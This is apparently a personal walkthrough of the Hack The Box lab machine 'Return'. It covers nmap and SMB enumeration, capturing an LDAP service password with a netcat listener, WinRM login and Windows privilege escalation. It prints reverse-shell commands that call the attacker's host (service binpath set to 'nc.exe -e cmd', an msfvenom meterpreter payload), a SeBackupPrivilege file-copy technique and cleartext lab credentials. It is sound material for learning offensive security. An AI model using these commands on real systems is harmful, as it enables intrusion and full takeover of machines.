# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
	```bash
nmap -sV -sC -vv 10.10.11.108
nmap -sU --top-ports=10 -vv 10.10.11.108

--OUTPUT-TCP---
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-21 20:36:41Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-21T20:36:44
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 31931/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 54836/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 26260/udp): CLEAN (Timeout)
|   Check 4 (port 40628/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 18m34s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

---OUTPUT-UDP---
PORT     STATE         SERVICE      REASON
53/udp   open          domain       udp-response ttl 127
123/udp  open          ntp          udp-response ttl 127
```
	- Http 80, kerberos, rpc, ldap, smb
	- Domain : return.local

## SMB Enumeration
- Got a hit with crackmapexec but could not access shares (Other login inputs failed):
	```bash
crackmapexec smb 10.10.11.108 -u '' -p ''

---OUTPUT---
SMB         10.10.11.108    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\: 
```

## Directory Enumeration
- Gobuster:
	- Directory
		```bash
gobuster dir -u http://return.local dns -x php --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root

---OUTPUT---
/images               (Status: 301) [Size: 150] [--> http://return.local/images/]
/index.php            (Status: 200) [Size: 28274]
/Images               (Status: 301) [Size: 150] [--> http://return.local/Images/]
/Index.php            (Status: 200) [Size: 28274]
/settings.php         (Status: 200) [Size: 29090]
/IMAGES               (Status: 301) [Size: 150] [--> http://return.local/IMAGES/]
/INDEX.php            (Status: 200) [Size: 28274]
/SETTINGS.php         (Status: 200) [Size: 29090]
```


## Website Enumeration and Initial Foothold
- 
### Direct
- the settings.php shows port 389 and a user svc-printer
	- On using kerbrute we see the user is valid
		```bash
vi user # Copy user "svc-printer" here
./kerbrute_linux_amd64 userenum --dc 10.10.11.108 -d return.local /home/kali/Downloads/Windows/ActiveDirectory/Return/user

---OUTPUT---
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/21/25 - Ronnie Flathers @ropnop

2025/04/21 16:35:43 >  Using KDC(s):
2025/04/21 16:35:43 >   10.10.11.108:88

2025/04/21 16:35:43 >  [+] VALID USERNAME:       svc-printer@return.local
2025/04/21 16:35:43 >  Done! Tested 1 usernames (1 valid) in 0.022 seconds
```
- Port 389 is for LDAP. We turn on netcat to see if we can catch anything. We add our IP address as the server address and have netcat listening
	- I first try to add 9999 but nothing happens so I check if I get anything at 389 since that was there already
		```bash
nc -lvnp 389

---OUTPUT---
listening on [any] 389 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.108] 59328
0*`%return\svc-printer�
                       1edFg43012!!
```
		- We get some text. This may be a password.
- We check if these credentials work
	```bash
crackmapexec smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
crackmapexec smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!' --shares
--
crackmapexec winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'

---OUTPUT-SMB-SHARES---
SMB         10.10.11.108    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
SMB         10.10.11.108    445    PRINTER          [+] Enumerated shares
SMB         10.10.11.108    445    PRINTER          Share           Permissions     Remark
SMB         10.10.11.108    445    PRINTER          -----           -----------     ------
SMB         10.10.11.108    445    PRINTER          ADMIN$          READ            Remote Admin
SMB         10.10.11.108    445    PRINTER          C$              READ,WRITE      Default share
SMB         10.10.11.108    445    PRINTER          IPC$            READ            Remote IPC
SMB         10.10.11.108    445    PRINTER          NETLOGON        READ            Logon server share 
SMB         10.10.11.108    445    PRINTER          SYSVOL          READ            Logon server share 

---OUTPUT-WINRM---
SMB         10.10.11.108    5985   PRINTER          [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local)
HTTP        10.10.11.108    5985   PRINTER          [*] http://10.10.11.108:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.108    5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```
- We login to target with our credentials and grab the user flag.
	```bash
evil-winrm -u 'svc-printer' -p '1edFg43012!!' -i 10.10.11.108

---OUTPUT---
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> whoami
return\svc-printer
```
## Privilege Escalation
- On initial enumeration we check privileges:
	```bash
whoami /priv

---OUTPUT---
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled

```
	- From these, there are some exploitable privileges based on this link:
		- https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
		- SeBackupPrivilege and SeRestorePrivilege
		- SeLoadDriverPrivilege
### Exploiting SeBackupPrivilege/SeRestorePrivilege (robocopy)
- we clone this git repo
	- https://github.com/k4sth4/SeBackupPrivilege
- We create the file vss.dsh
	```bash
cat vss.dsh

---OUTPUT---
set context persistent nowriters
set metadata c:\\programdata\\test.cab        
set verbose on
add volume c: alias test
create
expose %test% z:
```
- We upload our files to the target:
	```bash
cd C:\temp
upload vss.dsh
upload SeBackupPrivilegeCmdLets.dll
upload SeBackupPrivilegeUtils.dll
```
- We import the modules and attempt the exploit with diskshadow (FAILS)
	```bash
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
diskshadow /s vss.dsh

---OUTPUT---
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  PRINTER,  4/21/2025 4:26:48 PM

-> set context persistent nowriters
-> set metadata c:\\programdata\\test.cab
-> set verbose on
-> add volume c: alias test

COM call "(*vssObject)->InitializeForBackup" failed.
```
	- This initially I checked if vss service was running and it wasn't so I started but it didn't change anything. I believe it is because this vss service is used for priv esc through another way (I think the intended way)
- We then try to copy a backup of the Adminsitrator's Desktop directory onto temp using robocopy
	```bash
robocopy /b C:\\users\\administrator\\desktop C:\\temp

---OUTPUT---
-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Monday, April 21, 2025 2:25:51 PM
   Source : C:\users\administrator\desktop\
     Dest : C:\temp\

    Files : *.*

  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           2    C:\users\administrator\desktop\
          *EXTRA File              12288        SeBackupPrivilegeCmdLets.dll
          *EXTRA File              16384        SeBackupPrivilegeUtils.dll
          *EXTRA File                144        vss.dsh
            New File                 282        desktop.ini
  0%
100%
            New File                  34        root.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         2         2         0         0         0         3
   Bytes :       316       316         0         0         0    28.1 k
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :               22571 Bytes/sec.
   Speed :               1.291 MegaBytes/min.
   Ended : Monday, April 21, 2025 2:25:51 PM
```
- The root flag should be available in our temp directory.
	```bash
dir

---OUTPUT---
    Directory: C:\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/21/2025   1:34 PM             34 root.txt
-a----        4/21/2025   2:23 PM          12288 SeBackupPrivilegeCmdLets.dll
-a----        4/21/2025   2:23 PM          16384 SeBackupPrivilegeUtils.dll
-a----        4/21/2025   2:22 PM            144 vss.dsh
```
### Alternate Method (Intended Route)
### Via BurpSuite
- Used BurpSuite but couldn't find anything relevant. Tried LFI and SQLi in settings.php but got nothing of value
### Via BloodHound
- I grabbed the files :
	```bash
bloodhound-python --dns-tcp -ns 10.10.11.108 -d return.local -u 'svc-printer' -p '1edFg43012!!' -c all
```
- There was no clear path but on checking svc-printer's Group Memberships we see it is a part of Server Operators group
	- ![[Pasted image 20250421192150.png]]
		- Alternatively, if we check `net users` on target we will see this group.
- We can see from this link: https://www.thehacker.recipes/ad/movement/builtins/security-groups
	- Server Operator group members can sign-in to a server, start and stop services, access domain controllers, perform maintenance tasks (such as backup and restore), and they have the ability to change binaries that are installed on the domain controllers.
- We try to see what services we can modify but we don't have permissions
	```bash
sc.exe query

---OUTPUT---

```
- We upload netcat to target
	```bash
upload nc.exe
```
- We then pass this command that changes the config for the vss service to call netcat and execute the command line to the target IP and port (a blind one..not sure how to figure out why vss as I didn't find any resource except 0xdf's which links to a post that doesn't exist anymore)
	```bash
sc.exe config VSS binpath="C:\temp\nc.exe -e cmd 10.10.14.25 9999"
sc.exe stop vss
sc.exe start vss

---OUTPUT-1--
[SC] ChangeServiceConfig SUCCESS

---OUTPUT-3---
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

---------------------------------------------------------------------------------
---ON-LOCAL-MACHINE---
nc -lvnp 9999

---OUTPUT---
listening on [any] 9999 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.108] 59439
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
	- But the shell is not stable and we disconnect after some time.
		- Why does this happen? (answer based on 0xdf notes)
			- when a service fails to run, it gets killed eventually.
			- If we pass a command that points to the command line itself and then executes netcat with the command line, we can avoid this timeout:
				```bash
sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\temp\nc.exe -e cm
d 10.10.14.25 9999"
sc.exe stop vss
sc.exe start vss

---OUTPUT-1--
[SC] ChangeServiceConfig SUCCESS

---OUTPUT-3---
<Nothing>
```
				- This time our Reverse Shell won't time out.
- Alternatively,we can use meterpreter to get a more stable shell but first getting access and then migrating to another process. First we create our executable which will reach out to our meterpreter
	```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=1337 -f exe > shell-x86.exe
```
	- We uplaod this shell to our target via our winrm session:
		```bash
upload shell-x86.exe
```
- We then create our metasploit lsitener and configure it for a reverse shell:
	```bash
msfconsole
use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.25
msf6 exploit(multi/handler) > set LPORT 9999
msf6 exploit(multi/handler) > run

---OUTPUT---
[*] Started reverse TCP handler on 10.10.14.25:9999
```
- Then on our target, we configure the vss service to point to our executable be uploaded (which will reach to our listener)
	```bash
sc.exe config vss binPath="C:\temp\shell-x86.exe"
sc.exe stop vss
sc.exe start vss
```
- We get a hit on our meterpreter listener. We then check out the running services and migrate to one owned by "NT authority/system"
	```bash
[*] Sending stage (177734 bytes) to 10.10.11.108
[*] Meterpreter session 1 opened (10.10.14.25:9999 -> 10.10.11.108:59481) at 2025-04-21 19:54:03 -0400

meterpreter > ps

---OUTPUT---
...
...
1452  620   svchost.exe       x64   0        NT AUTHORITY\SYSTEM         C:\Windows\System32\svchost
                                                                          .exe
 1496  620   svchost.exe       x64   0        NT AUTHORITY\LOCAL SERVICE  C:\Windows\System32\svchost
                                                                          .exe
 1512  620   svchost.exe       x64   0        NT AUTHORITY\NETWORK SERVI  C:\Windows\System32\svchost
                                              CE                          .exe
 1536  620   svchost.exe       x64   0        NT AUTHORITY\SYSTEM         C:\Windows\System32\svchost
                                                                          .exe
 1620  620   svchost.exe       x64   0        NT AUTHORITY\SYSTEM         C:\Windows\System32\svchost
                                                                          .exe
 1664  620   svchost.exe       x64   0        NT AUTHORITY\SYSTEM         C:\Windows\System32\svchost
                                                                          .exe
 1684  620   svchost.exe       x64   0        NT AUTHORITY\LOCAL SERVICE  C:\Windows\System32\svchost
                                                                          .exe
 1744  620   svchost.exe       x64   0        NT AUTHORITY\LOCAL SERVICE  C:\Windows\System32\svchost
                                                                          .exe
 1812  620   svchost.exe       x64   0        NT AUTHORITY\SYSTEM         C:\Windows\System32\svchost
...
...
```
- We migrate to another pid and get a shell:
	```bash
meterpreter > migrate 1664
meterpreter > shell

---OUTPUT-MIGRATE---
[*] Migrating from 368 to 1664...
[*] Migration completed successfully.

---OUTPUT-SHELL---
Process 4612 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
	- We get a stable shell and can grab the user flag.
## SeLoadDriverPrivilege exploit (Exploit from Windows)
- I think the HTB lab Fuse by Ippsec show's how we can exploit it:
	- https://www.youtube.com/watch?v=VxbC03xmS60&t=1610s&ab_channel=IppSec
		- Says he explains it even more in Fighter htb
			- https://www.youtube.com/watch?v=CW4mI5BkP9E&t=55s&ab_channel=IppSec
				- Needs to be done on Windows (To do)
- I tried this as an alternative but it failed :https://github.com/JoshMorrison99/SeLoadDriverPrivilege
	```bash
.\ExploitCapcom.exe

---OUTPUT---
[+] No path was given. Default path C:\ProgramData\rev.exe
[*] Capcom.sys exploit
[-] CreateFile failed
```

----
--------------
## Extras
### LDAPsearch
- Also tried ldapsearch to see if we could get anything with these credentials:
	```bash
ldapsearch -H ldap://return.local -D 'svc-printer@return.local' -w '1edFg43012!!' -b "DC=return,DC=local"
```
	- We don't find anything of value. No other users, nothing
-------
--------